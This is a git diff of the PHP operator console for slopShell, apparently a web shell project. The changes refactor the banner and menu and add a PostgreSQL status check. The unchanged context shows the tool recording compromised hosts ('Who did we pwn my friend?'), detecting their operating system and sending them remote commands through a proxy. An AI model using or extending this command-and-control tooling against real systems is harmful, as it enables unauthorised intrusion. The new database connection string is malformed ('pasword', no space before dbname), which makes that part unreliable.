@@ -12,29 +12,61 @@ $cof = array(
 
 pclose(popen("nohup proxybroker serve --host 127.0.0.1 --port 8090 --types HTTPS HTTP --lvl High &", "r"));
 is_file("sloppy_config.ini") ? define("config", parse_ini_file('sloppy_config.ini', true)):define("config", $cof);
-try{
 
+try{
     define("CHH", curl_init());
     curl_setopt(CHH, CURLOPT_USERAGENT,       config['useragent']);
     curl_setopt(CHH, CURLOPT_PROXY,           config["proxy"]);
 }catch (Exception $e){
     print("{$e}\n\n");
 }
+define('ppg', pg_connect("host=" . config['host'] . " port=" . config['port'] . " user=" . config['username'] . " pasword=" . config['password'] . "dbname=".config['dbname']));
 
-function menu($clear)
-{
-    if (!empty($clear)) {
-        system($clear);
+function logo($last, $cl){
+    if ($last === "q"){
+        system($cl);
+        echo("\033[33;40m                                                                                    \033[0m\n");
+        echo("\033[33;40m    ▄▄▄▄▄   █    ████▄ █ ▄▄  █ ▄▄ ▀▄    ▄     ▄█▄    █    ▄█ ▄███▄      ▄     ▄▄▄▄▀ \033[0m\n");
+        echo("\033[33;40m   █     ▀▄ █    █   █ █   █ █   █  █  █      █▀ ▀▄  █    ██ █▀   ▀      █ ▀▀▀ █    \033[0m\n");
+        echo("\033[33;40m ▄  ▀▀▀▀▄   █    █   █ █▀▀▀  █▀▀▀    ▀█       █   ▀  █    ██ ██▄▄    ██   █    █    \033[0m\n");
+        echo("\033[33;40m  ▀▄▄▄▄▀    ███▄ ▀████ █     █       █        █▄  ▄▀ ███▄ ▐█ █▄   ▄▀ █ █  █   █     \033[0m\n");
+        echo("\033[33;40m                ▀       █     █    ▄▀         ▀███▀      ▀ ▐ ▀███▀   █  █ █  ▀      \033[0m\n");
+        echo("\033[33;40m                         ▀     ▀                                     █   ██         \033[0m\n");
+        echo("\033[33;40m                                                                                    \033[0m\n");
+        echo("\033[33;40m  Gr33tz: Notroot, J5                                                               \033[0m\n");
+        echo("\033[33;40m  Git: https://github.com/oldkingcone/slopShell                                     \033[0m\n");
+
+    }else if (is_null($last))  {
+        system($cl);
+        echo("\033[33;40m                                                                                    \033[0m\n");
+        echo("\033[33;40m    ▄▄▄▄▄   █    ████▄ █ ▄▄  █ ▄▄ ▀▄    ▄     ▄█▄    █    ▄█ ▄███▄      ▄     ▄▄▄▄▀ \033[0m\n");
+        echo("\033[33;40m   █     ▀▄ █    █   █ █   █ █   █  █  █      █▀ ▀▄  █    ██ █▀   ▀      █ ▀▀▀ █    \033[0m\n");
+        echo("\033[33;40m ▄  ▀▀▀▀▄   █    █   █ █▀▀▀  █▀▀▀    ▀█       █   ▀  █    ██ ██▄▄    ██   █    █    \033[0m\n");
+        echo("\033[33;40m  ▀▄▄▄▄▀    ███▄ ▀████ █     █       █        █▄  ▄▀ ███▄ ▐█ █▄   ▄▀ █ █  █   █     \033[0m\n");
+        echo("\033[33;40m                ▀       █     █    ▄▀         ▀███▀      ▀ ▐ ▀███▀   █  █ █  ▀      \033[0m\n");
+        echo("\033[33;40m                         ▀     ▀                                     █   ██         \033[0m\n");
+        echo("\033[33;40m                                                                                    \033[0m\n");
+        echo("\033[33;40m  Gr33tz: Notroot, J5                                                               \033[0m\n");
+        echo("\033[33;40m  Git: https://github.com/oldkingcone/slopShell                                     \033[0m\n");
+        menu();
+    }else{
+        system($cl);
+        echo("\033[33;40m                                                                                    \033[0m\n");
+        echo("\033[33;40m    ▄▄▄▄▄   █    ████▄ █ ▄▄  █ ▄▄ ▀▄    ▄     ▄█▄    █    ▄█ ▄███▄      ▄     ▄▄▄▄▀ \033[0m\n");
+        echo("\033[33;40m   █     ▀▄ █    █   █ █   █ █   █  █  █      █▀ ▀▄  █    ██ █▀   ▀      █ ▀▀▀ █    \033[0m\n");
+        echo("\033[33;40m ▄  ▀▀▀▀▄   █    █   █ █▀▀▀  █▀▀▀    ▀█       █   ▀  █    ██ ██▄▄    ██   █    █    \033[0m\n");
+        echo("\033[33;40m  ▀▄▄▄▄▀    ███▄ ▀████ █     █       █        █▄  ▄▀ ███▄ ▐█ █▄   ▄▀ █ █  █   █     \033[0m\n");
+        echo("\033[33;40m                ▀       █     █    ▄▀         ▀███▀      ▀ ▐ ▀███▀   █  █ █  ▀      \033[0m\n");
+        echo("\033[33;40m                         ▀     ▀                                     █   ██         \033[0m\n");
+        echo("\033[33;40m                                                                                    \033[0m\n");
+        echo("\033[33;40m  Last command: $last                                                               \033[0m\n");
+        menu();
     }
-    echo("\033[33;40m                                                                                    \033[0m\n");
-    echo("\033[33;40m    ▄▄▄▄▄   █    ████▄ █ ▄▄  █ ▄▄ ▀▄    ▄     ▄█▄    █    ▄█ ▄███▄      ▄     ▄▄▄▄▀ \033[0m\n");
-    echo("\033[33;40m   █     ▀▄ █    █   █ █   █ █   █  █  █      █▀ ▀▄  █    ██ █▀   ▀      █ ▀▀▀ █    \033[0m\n");
-    echo("\033[33;40m ▄  ▀▀▀▀▄   █    █   █ █▀▀▀  █▀▀▀    ▀█       █   ▀  █    ██ ██▄▄    ██   █    █    \033[0m\n");
-    echo("\033[33;40m  ▀▄▄▄▄▀    ███▄ ▀████ █     █       █        █▄  ▄▀ ███▄ ▐█ █▄   ▄▀ █ █  █   █     \033[0m\n");
-    echo("\033[33;40m                ▀       █     █    ▄▀         ▀███▀      ▀ ▐ ▀███▀   █  █ █  ▀      \033[0m\n");
-    echo("\033[33;40m                         ▀     ▀                                     █   ██         \033[0m\n");
-    echo("\033[33;40m                                                                                    \033[0m\n");
-    echo("\033[33;40m");
+
+}
+
+function menu()
+{
     echo <<< _MENU
         (O)ptions                                                                   
         (S)ystem enumeration                                                        
@@ -59,9 +91,14 @@ function opts(){
     }
     print("\n".str_repeat("-", 35) . "\n");
     print("\n\nCurrent DB Status:\n\n");
-    print(pg_ping()."\n");
-    print(pg_port()."\n");
-    print(pg_host()."\n");
+    if (ppg == PGSQL_CONNECTION_OK or ppg == PGSQL_CONNECTION_AUTH_OK){
+        print("\nConnected!");
+        print("\nPG Host: ". pg_host(ppg));
+        print("\nPG Port: ". pg_port(ppg));
+        print("\nPG Ping? ". pg_ping(ppg));
+    }else{
+        print("Could not connect... ensure the DB is running and we are allowed to connect to it.");
+    }
     print("\n".str_repeat("-", 35) . "\n");
     print("\n\nProxybroker?\n\n");
     print(system("ps aux | grep proxybroker")."\n");
@@ -331,12 +368,14 @@ function queryDB($host, $fetchWhat){
 }
 
 (strtolower(php_uname()) == "windows") ? $clears='cls':$clears="clear";
-menu($clears);
 $run = true;
+logo($lc = null, $clears);
 while ($run) {
     print("\n\033[33;40mPlease select your choice: \n->");
     echo("\033[0m");
     $pw = trim(fgets(STDIN));
+    $lc = $pw;
+    logo($lc, $clears);
     switch (strtolower($pw)) {
         case "cr":
             system($clears);
@@ -362,7 +401,7 @@ while ($run) {
             try {
                 $o = !empty(queryDB($h, 'r')) ? "win" : "lin";
             } catch (Exception $e) {
-                menu($clears);
+                logo($lc, $clears);
                 echo $e."\n";
             }
             echo $o;
@@ -377,7 +416,7 @@ while ($run) {
                 $c = readline("And now the command: \n->");
                 co($c, $h, queryDB($h, 'c'));
             }catch (Exception $e){
-                menu($clears);
+                logo($lc, $clears);
                 echo $e."\n";
             }
             break;
@@ -401,7 +440,7 @@ while ($run) {
                 $h = readline("Who did we pwn my friend?\n->");
                 aHo($h);
             }catch (Exception $e){
-                menu($clears);
+                logo($lc, $clears);
                 echo $e."\n";
             }
             break;
@@ -424,24 +463,25 @@ while ($run) {
                         break;
                 }
             }catch (Exception $e){
-                menu($clears);
+                logo($lc, $clears);
                 echo $e."\n";
             }
             break;
         case "m":
-            menu($clear = "clear");
+            logo($lc, $clears);
             break;
         case "q":
-            system($clears);
+            logo($lc, $clears);
             system("killall proxybroker");
-            echo "\033[33;40mGood bye!\033[0m\n";
+            print("\033[33;40m  All proxybroker instances have been killed, they died in peace.. in their sleep. F in chat to pay respects.\n");
+            echo "  Good bye!\033[0m\n";
             $run = false;
             break;
         case "o":
             opts();
             break;
         default:
-            menu($clear = "clear");
+            logo($lc, $clears);
             echo "\033[33;40myou need to select a valid option...\033[0m\n";
     }
 }
